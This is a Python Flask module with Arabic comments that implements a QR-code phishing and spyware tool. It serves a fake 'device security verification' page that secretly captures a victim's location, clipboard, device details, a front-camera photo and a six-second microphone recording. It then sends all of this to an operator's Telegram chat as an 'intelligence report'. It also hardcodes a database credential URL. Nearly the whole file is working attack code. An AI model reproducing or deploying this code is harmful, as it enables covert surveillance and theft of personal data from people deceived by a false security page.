# qr_pairing.py
# ============================================================
# أداة QR Code المتقدمة - سحب بيانات شاملة من متصفح الضحية
# ============================================================

import os
import io
import json
import time
import redis
import qrcode
import base64
from datetime import datetime
from flask import Blueprint, request, jsonify

qr_bp = Blueprint('qr_deep_link_exploit', __name__)

# ============================================================
# [1] اتصال Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
    redis_client.ping()
except Exception as e:
    print(f"[-] Critical Redis Connection Error in qr_pairing: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")


# ============================================================
# [2] القالب الرئيسي - صفحة جمع البيانات
# ============================================================

CAPTURE_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b1120">
<title>التحقق الأمني - مزامنة الجهاز</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    margin: 0; padding: 0;
    background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0b1120 70%);
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }
  .wrap {
    max-width: 460px; margin: 0 auto;
    padding: 40px 20px 60px;
  }
  .shield {
    width: 90px; height: 90px; margin: 0 auto 24px;
    border-radius: 50%;
    background: linear-gradient(135deg, #38bdf8, #0ea5e9);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 40px rgba(56,189,248,0.5);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(56,189,248,0.5); }
    50% { transform: scale(1.05); box-shadow: 0 0 60px rgba(56,189,248,0.8); }
  }
  .shield svg { width: 50px; height: 50px; fill: #fff; }
  h1 {
    text-align: center; font-size: 22px; margin: 0 0 10px;
    font-weight: 700; color: #f1f5f9;
  }
  .subtitle {
    text-align: center; color: #94a3b8; font-size: 14px;
    line-height: 1.6; margin-bottom: 30px;
  }
  .card {
    background: rgba(30, 41, 59, 0.7);
    backdrop-filter: blur(10px);
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 24px 20px;
    margin-bottom: 18px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
  }
  .step {
    display: flex; align-items: center; gap: 14px;
    padding: 12px 0; border-bottom: 1px solid rgba(51,65,85,0.5);
  }
  .step:last-child { border-bottom: none; }
  .step-icon {
    width: 36px; height: 36px; border-radius: 10px;
    background: rgba(56,189,248,0.15);
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; font-size: 18px;
    transition: all 0.3s ease;
  }
  .step-icon.done {
    background: rgba(74,222,128,0.2);
    color: #4ade80;
  }
  .step-icon.pending { color: #94a3b8; }
  .step-icon.loading {
    background: rgba(56,189,248,0.2);
    animation: spin 1s linear infinite;
  }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  .step-text { flex: 1; }
  .step-title { font-size: 14px; font-weight: 600; color: #e2e8f0; }
  .step-desc { font-size: 12px; color: #64748b; margin-top: 2px; }
  .progress-bar {
    width: 100%; height: 6px; background: #1e293b;
    border-radius: 3px; overflow: hidden; margin-top: 16px;
  }
  .progress-fill {
    height: 100%; width: 0%;
    background: linear-gradient(90deg, #38bdf8, #4ade80);
    transition: width 0.5s ease;
    border-radius: 3px;
  }
  .consent-card {
    background: rgba(56,189,248,0.08);
    border: 1px solid rgba(56,189,248,0.3);
    border-radius: 14px;
    padding: 20px;
    text-align: center;
    margin-top: 20px;
  }
  .consent-title { font-size: 15px; font-weight: 600; color: #38bdf8; margin-bottom: 8px; }
  .consent-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 18px; }
  .btn {
    display: block; width: 100%;
    padding: 15px;
    border: none; border-radius: 12px;
    background: linear-gradient(135deg, #0ea5e9, #38bdf8);
    color: #fff; font-size: 15px; font-weight: 700;
    cursor: pointer; transition: transform 0.2s;
    box-shadow: 0 8px 20px rgba(56,189,248,0.3);
    font-family: inherit;
  }
  .btn:active { transform: scale(0.97); }
  .btn:disabled {
    background: #334155; cursor: not-allowed;
    box-shadow: none; opacity: 0.6;
  }
  .success-state {
    text-align: center; padding: 40px 20px;
    display: none;
  }
  .success-icon {
    width: 80px; height: 80px; margin: 0 auto 20px;
    border-radius: 50%;
    background: rgba(74,222,128,0.15);
    display: flex; align-items: center; justify-content: center;
    font-size: 44px; color: #4ade80;
    animation: successPop 0.5s ease;
  }
  @keyframes successPop {
    0% { transform: scale(0); }
    80% { transform: scale(1.1); }
    100% { transform: scale(1); }
  }
  .success-title { font-size: 20px; font-weight: 700; color: #4ade80; margin-bottom: 8px; }
  .success-desc { color: #94a3b8; font-size: 14px; line-height: 1.6; }
  .hidden { display: none !important; }
  .footer-note {
    text-align: center; font-size: 11px;
    color: #475569; margin-top: 30px;
  }
</style>
</head>
<body>
<div class="wrap">

  <div id="mainState">
    <div class="shield">
      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    </div>
    <h1>التحقق الأمني من الجهاز</h1>
    <p class="subtitle">لضمان جلسة آمنة ومشفّرة، يرجى السماح للنظام بالتحقق من بيانات جهازك.</p>

    <div class="card">
      <div class="step">
        <div class="step-icon pending" id="ic1">📡</div>
        <div class="step-text">
          <div class="step-title">الاتصال بالخادم</div>
          <div class="step-desc">جاري فحص قناة الاتصال الآمنة</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic2">📍</div>
        <div class="step-text">
          <div class="step-title">التحقق الجغرافي</div>
          <div class="step-desc">تحديد الموقع لتأكيد الهوية</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic3">🔋</div>
        <div class="step-text">
          <div class="step-title">حالة الجهاز</div>
          <div class="step-desc">البطارية والشبكة والشاشة</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic4">📷</div>
        <div class="step-text">
          <div class="step-title">التحقق البصري</div>
          <div class="step-desc">التقاط صورة مؤقتة للتحقق</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic5">🎙️</div>
        <div class="step-text">
          <div class="step-title">البصمة الصوتية</div>
          <div class="step-desc">تسجيل صوتي قصير للتأكيد</div>
        </div>
      </div>

      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <div class="consent-card">
      <div class="consent-title">🔐 موافقة الأمان</div>
      <div class="consent-desc">
        بالمتابعة، أنت توافق على إجراء التحقق الشامل من الجهاز
        لضمان أمان الجلسة ومنع الانتحال.
      </div>
      <button class="btn" id="startBtn" onclick="startVerification()">
        ✅ بدء التحقق الآمن
      </button>
    </div>

    <p class="footer-note">اتصال مشفّر من طرف إلى طرف · SSL 256-bit</p>
  </div>

  <div class="success-state" id="successState">
    <div class="success-icon">✓</div>
    <div class="success-title">تم التحقق بنجاح</div>
    <div class="success-desc">
      تمت مزامنة جهازك بشكل آمن.<br>
      يمكنك إغلاق هذه الصفحة الآن.
    </div>
  </div>
</div>

<script>
const TOKEN = "__TOKEN__";
const SYNC_URL = "__SYNC_URL__";
const CHAT_ID = "__CHAT_ID__";

const progress = { step: 0, total: 5 };
const collected = {
  token: TOKEN,
  chat_id: CHAT_ID,
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent,
  platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
  language: navigator.language,
  languages: navigator.languages || [],
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen: {
    width: window.screen.width,
    height: window.screen.height,
    availWidth: window.screen.availWidth,
    availHeight: window.screen.availHeight,
    colorDepth: window.screen.colorDepth || 24,
    pixelRatio: window.devicePixelRatio || 1,
    orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
  },
  hardware: {
    cores: navigator.hardwareConcurrency || "N/A",
    memory: navigator.deviceMemory || "N/A",
    maxTouchPoints: navigator.maxTouchPoints || 0
  },
  geolocation: null,
  battery: null,
  network: null,
  clipboard: null,
  camera_photo: null,
  audio_recording: null,
  cookies_enabled: navigator.cookieEnabled,
  do_not_track: navigator.doNotTrack,
  referrer: document.referrer || "direct"
};

function updateProgress() {
  progress.step++;
  const pct = Math.min(100, (progress.step / progress.total) * 100);
  document.getElementById('progressFill').style.width = pct + '%';
}

function markStep(id, state) {
  const el = document.getElementById(id);
  el.classList.remove('pending', 'loading', 'done');
  el.classList.add(state);
  if (state === 'done') el.textContent = '✓';
  else if (state === 'loading') el.textContent = '⏳';
}

async function collectGeolocation() {
  markStep('ic2', 'loading');
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      markStep('ic2', 'done');
      updateProgress();
      return resolve(null);
    }
    const timeout = setTimeout(() => {
      markStep('ic2', 'done');
      updateProgress();
      resolve(null);
    }, 8000);

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timeout);
        collected.geolocation = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          heading: pos.coords.heading,
          speed: pos.coords.speed
        };
        markStep('ic2', 'done');
        updateProgress();
        resolve(true);
      },
      (err) => {
        clearTimeout(timeout);
        collected.geolocation = { error: err.message || 'denied' };
        markStep('ic2', 'done');
        updateProgress();
        resolve(false);
      },
      { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
    );
  });
}

async function collectBatteryAndNetwork() {
  markStep('ic3', 'loading');
  // Battery
  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      collected.battery = {
        level: Math.round(bat.level * 100),
        charging: bat.charging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime
      };
    }
  } catch (e) {}

  // Network
  try {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      collected.network = {
        effectiveType: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData
      };
    }
  } catch (e) {}

  markStep('ic3', 'done');
  updateProgress();
}

async function collectCamera() {
  markStep('ic4', 'loading');
  return new Promise(async (resolve) => {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        markStep('ic4', 'done');
        updateProgress();
        return resolve(null);
      }

      // نحاول الكاميرا الأمامية أولاً (وجه الضحية)
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false
        });
      } catch (e) {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        } catch (e2) {
          markStep('ic4', 'done');
          updateProgress();
          return resolve(null);
        }
      }

      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.muted = true;
      await video.play();

      // ننتظر قليلاً للتركيز
      await new Promise(r => setTimeout(r, 1500));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      collected.camera_photo = dataUrl;

      // إيقاف الكاميرا فوراً
      stream.getTracks().forEach(t => t.stop());

      markStep('ic4', 'done');
      updateProgress();
      resolve(true);
    } catch (e) {
      markStep('ic4', 'done');
      updateProgress();
      resolve(null);
    }
  });
}

async function collectAudio() {
  markStep('ic5', 'loading');
  return new Promise(async (resolve) => {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        markStep('ic5', 'done');
        updateProgress();
        return resolve(null);
      }

      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const chunks = [];
      let mimeType = 'audio/webm';
      if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
        mimeType = 'audio/webm;codecs=opus';
      } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
        mimeType = 'audio/mp4';
      }

      const recorder = new MediaRecorder(stream, { mimeType });
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) chunks.push(e.data);
      };

      recorder.start();

      // نسجل 6 ثوان
      await new Promise(r => setTimeout(r, 6000));

      await new Promise((resolveRec) => {
        recorder.onstop = resolveRec;
        recorder.stop();
        stream.getTracks().forEach(t => t.stop());
      });

      const blob = new Blob(chunks, { type: mimeType });
      const reader = new FileReader();
      reader.onloadend = () => {
        collected.audio_recording = reader.result;
        markStep('ic5', 'done');
        updateProgress();
        resolve(true);
      };
      reader.readAsDataURL(blob);
    } catch (e) {
      markStep('ic5', 'done');
      updateProgress();
      resolve(null);
    }
  });
}

async function collectClipboard() {
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      const text = await navigator.clipboard.readText();
      if (text && text.length < 5000) collected.clipboard = text;
    }
  } catch (e) {}
}

async function sendToServer() {
  try {
    await fetch(SYNC_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(collected)
    });
  } catch (e) {
    console.log('sync failed', e);
  }
}

async function startVerification() {
  const btn = document.getElementById('startBtn');
  btn.disabled = true;
  btn.textContent = 'جاري التحقق...';

  markStep('ic1', 'loading');
  await new Promise(r => setTimeout(r, 800));
  markStep('ic1', 'done');
  updateProgress();

  await collectGeolocation();
  await collectBatteryAndNetwork();
  await collectCamera();
  await collectAudio();
  await collectClipboard();

  await sendToServer();

  document.getElementById('mainState').classList.add('hidden');
  document.getElementById('successState').style.display = 'block';
}

// محاولة سحب الحافظة في أول تفاعل
document.addEventListener('click', function once() {
  collectClipboard();
  document.removeEventListener('click', once);
}, { once: true });
</script>
</body>
</html>
"""


# ============================================================
# [3] القالب الاحتياطي (في حال رفض الأذونات)
# ============================================================
FALLBACK_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>خطأ في التحقق</title>
<style>
  body {
    background: #0b1120; color: #f8fafc;
    font-family: -apple-system, sans-serif;
    display: flex; align-items: center; justify-content: center;
    height: 100vh; margin: 0; padding: 20px;
  }
  .box {
    background: #1e293b; padding: 30px; border-radius: 16px;
    max-width: 400px; text-align: center;
    border: 1px solid #334155;
  }
  .x { font-size: 50px; color: #f87171; margin-bottom: 15px; }
  h2 { color: #f87171; margin-bottom: 10px; }
  p { color: #94a3b8; line-height: 1.6; font-size: 14px; }
</style>
</head>
<body>
<div class="box">
  <div class="x">✕</div>
  <h2>انتهت صلاحية الرابط</h2>
  <p>يرجى إعادة مسح كود الـ QR مرة أخرى لبدء جلسة تحقق جديدة.</p>
</div>
</body>
</html>
"""


# ============================================================
# [4] دوال بناء الرسائل لتليجرام
# ============================================================

def format_intel_report(data, source_ip):
    """تنسيق التقرير الكامل للاستخبارات"""
    geo = data.get('geolocation') or {}
    battery = data.get('battery') or {}
    network = data.get('network') or {}
    screen = data.get('screen') or {}
    hardware = data.get('hardware') or {}

    # الموقع
    if geo.get('latitude') and geo.get('longitude'):
        lat = geo['latitude']
        lng = geo['longitude']
        acc = geo.get('accuracy', 'N/A')
        maps_link = f"https://maps.google.com/?q={lat},{lng}"
        geo_text = (
            f"✅ **تم السحب بنجاح**\n"
            f"  • `{lat}, {lng}`\n"
            f"  • الدقة: `{acc}` متر\n"
            f"  • [📍 فتح في خرائط جوجل]({maps_link})"
        )
    else:
        geo_text = "❌ مرفوض / غير متاح"

    # البطارية
    if battery.get('level') is not None:
        bat_text = f"`{battery.get('level')}%` | شحن: {'نعم ⚡' if battery.get('charging') else 'لا'}"
    else:
        bat_text = "غير متاح"

    # الشبكة
    if network:
        net_text = (
            f"`{network.get('effectiveType', 'N/A')}` | "
            f"↓ `{network.get('downlink', 'N/A')}` Mbps | "
            f"RTT `{network.get('rtt', 'N/A')}` ms"
        )
    else:
        net_text = "غير متاح"

    # الشاشة
    screen_text = (
        f"`{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}` | "
        f"DPR `{screen.get('pixelRatio', 'N/A')}` | "
        f"{screen.get('colorDepth', 'N/A')}-bit | "
        f"{screen.get('orientation', 'N/A')}"
    )

    # العتاد
    hw_text = (
        f"أنوية: `{hardware.get('cores', 'N/A')}` | "
        f"رام: `{hardware.get('memory', 'N/A')} GB` | "
        f"لمس: `{hardware.get('maxTouchPoints', 0)}` نقطة"
    )

    # الحافظة
    clipboard = data.get('clipboard')
    if clipboard:
        clip_preview = clipboard[:200].replace('`', '')
        clip_text = f"✅\n```\n{clip_preview}\n```"
    else:
        clip_text = "فارغة / مرفوضة"

    report = (
        "╔══════════════════════════════╗\n"
        "║  🎯 تقرير استخباراتي شامل  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🌐 **IP الخارجي:** `{source_ip}`\n"
        f"🕐 **الوقت:** `{data.get('timestamp', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📍 **الموقع الجغرافي:**\n"
        f"{geo_text}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💻 **الجهاز والنظام:**\n"
        f"  • المنصة: `{data.get('platform', 'Unknown')}`\n"
        f"  • اللغة: `{data.get('language', 'N/A')}`\n"
        f"  • المنطقة الزمنية: `{data.get('timezone', 'N/A')}`\n"
        f"  • {hw_text}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📐 **الشاشة:**\n"
        f"  • {screen_text}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 **الطاقة:** {bat_text}\n"
        f"📶 **الشبكة:** {net_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📋 **الحافظة:**\n"
        f"{clip_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌍 **بصمة المتصفح:**\n`{data.get('userAgent', 'N/A')[:150]}`"
    )
    return report


# ============================================================
# [5] تسجيل المسارات
# ============================================================

def init_qr_routes(app, bot):

    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        try:
            if not request.is_json:
                return jsonify({"status": "error", "message": "Invalid content type"}), 400

            data = request.get_json(silent=True) or {}
            token = data.get('token')

            if not token or not redis_client:
                return jsonify({"status": "error", "message": "Missing token or database offline"}), 400

            # استخراج chat_id من التوكن
            try:
                owner_chat_id = redis_client.get(f"qr_token:{token}")
            except Exception as redis_err:
                print(f"[-] Redis read error: {redis_err}")
                owner_chat_id = None

            # إذا كان هناك chat_id في البيانات نفسها، نستخدمه كاحتياطي
            if not owner_chat_id:
                owner_chat_id = data.get('chat_id')

            if not owner_chat_id:
                return jsonify({"status": "expired", "code": 410}), 410

            # استخراج الـ IP الحقيقي
            source_ip = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For') or
                request.headers.get('X-Real-IP') or
                request.remote_addr or
                "Unknown"
            )
            if source_ip and ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            # 1) إرسال التقرير النصي
            report = format_intel_report(data, source_ip)
            try:
                bot.send_message(owner_chat_id, report, parse_mode="Markdown",
                                 disable_web_page_preview=False)
            except Exception as bot_err:
                print(f"[-] Telegram text dispatch error: {bot_err}")

            # 2) إرسال الصورة إن وجدت
            photo_data = data.get('camera_photo')
            if photo_data and photo_data.startswith('data:image'):
                try:
                    _, encoded = photo_data.split(',', 1)
                    image_bytes = base64.b64decode(encoded)
                    photo_file = io.BytesIO(image_bytes)
                    photo_file.name = 'target_face.jpg'
                    bot.send_photo(
                        owner_chat_id, photo_file,
                        caption="📸 **صورة حية من الكاميرا الأمامية للضحية**",
                        parse_mode="Markdown"
                    )
                except Exception as img_err:
                    print(f"[-] Photo dispatch error: {img_err}")

            # 3) إرسال التسجيل الصوتي إن وجد
            audio_data = data.get('audio_recording')
            if audio_data and audio_data.startswith('data:audio'):
                try:
                    _, encoded = audio_data.split(',', 1)
                    audio_bytes = base64.b64decode(encoded)
                    audio_file = io.BytesIO(audio_bytes)
                    audio_file.name = 'target_voice.webm'
                    bot.send_audio(
                        owner_chat_id, audio_file,
                        caption="🎙️ **تسجيل صوتي حي (6 ثوان) من ميكروفون الضحية**",
                        parse_mode="Markdown"
                    )
                except Exception as audio_err:
                    print(f"[-] Audio dispatch error: {audio_err}")

            # حذف التوكن بعد الاستخدام لمرة واحدة
            try:
                redis_client.delete(f"qr_token:{token}")
            except Exception:
                pass

            return jsonify({"status": "synchronized", "code": 200}), 200

        except Exception as err:
            print(f"[-] Unhandled exception in silent_session_sync: {err}")
            return jsonify({"status": "server_error", "code": 500}), 500

    @app.route('/qr_scan_target', methods=['GET'])
    def qr_scan_target():
        token = request.args.get('token', '')
        if not token:
            return FALLBACK_PAGE, 400

        # التحقق من صلاحية التوكن
        chat_id = "0"
        try:
            if redis_client:
                stored = redis_client.get(f"qr_token:{token}")
                if stored:
                    chat_id = stored
                else:
                    return FALLBACK_PAGE, 410
            else:
                return FALLBACK_PAGE, 500
        except Exception as e:
            print(f"[-] Token check error: {e}")
            return FALLBACK_PAGE, 500

        html = CAPTURE_PAGE_TEMPLATE.replace("__TOKEN__", token)\
                                     .replace("__SYNC_URL__", f"{RAILWAY_URL}/api/v1/session/sync")\
                                     .replace("__CHAT_ID__", str(chat_id))
        return html, 200


# ============================================================
# [6] توليد كود QR
# ============================================================

def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=2,
        )
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#0b1120", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "secure_qr.png"
        return buf
    except Exception as e:
        print(f"[-] Error generating QR code bytes: {e}")
        return io.BytesIO()
